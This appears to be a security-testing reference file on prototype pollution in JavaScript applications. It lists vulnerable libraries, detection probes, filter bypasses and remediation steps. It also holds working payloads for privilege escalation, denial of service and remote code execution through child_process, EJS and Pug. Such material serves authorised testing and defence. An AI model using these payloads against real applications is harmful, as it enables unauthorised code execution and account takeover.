---
name: prototype_pollution
description: Prototype pollution for property injection, DoS, and RCE in JavaScript applications
---

# Prototype Pollution

## Attack Surface
- Object merge/clone: `lodash.merge`, `lodash.defaultsDeep`, `jQuery.extend(true)`
- JSON parsing where `__proto__` or `constructor` keys are not filtered
- Query string parsers (qs) creating nested objects from URL parameters
- Server-side Node.js where polluted properties affect control flow or templates

## Detection Techniques
- Inject `{"__proto__":{"polluted":true}}` in JSON; check if `({}).polluted===true`
- URL params: `?__proto__[polluted]=true` or `?constructor[prototype][polluted]=true`
- Review `package.json` for vulnerable libs (lodash < 4.17.21, jQuery < 3.4.0)

## Common Payloads

```json
// __proto__ pollution
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
// constructor.prototype
{"constructor": {"prototype": {"isAdmin": true}}}
// Query: ?__proto__[isAdmin]=true  ?constructor[prototype][isAdmin]=true
```

```javascript
// PP to RCE via child_process spawn
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
// PP to RCE via EJS template engine
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
// PP to RCE via Pug/Jade
{"__proto__": {"block": {"type":"Text","line":"process.mainModule.require('child_process').execSync('id')"}}}
// DoS via toString pollution
{"__proto__": {"toString": null}}
```

## Bypass Techniques
- `constructor.prototype` when `__proto__` is filtered
- Nested: `{"a":{"__proto__":{"x":true}}}` if only top-level is checked
- JSON dot notation in query strings when `__proto__` stripped from JSON body
- Pollute less obvious properties: `status`, `type`, `length`, `headers`

## Exploit Chaining
- PP + RCE: pollute EJS `outputFunctionName` or child_process spawn options
- PP + privilege escalation: set `isAdmin`/`role` inherited by auth checks
- PP + DoS: pollute `toString`/`valueOf` to crash object-to-primitive coercion

## Remediation
- `Object.create(null)` for lookup maps (no prototype chain)
- `Object.freeze(Object.prototype)` in bootstrap
- Reject `__proto__`, `constructor`, `prototype` keys from parsed input
- Update vulnerable libraries; use `Map` instead of plain objects
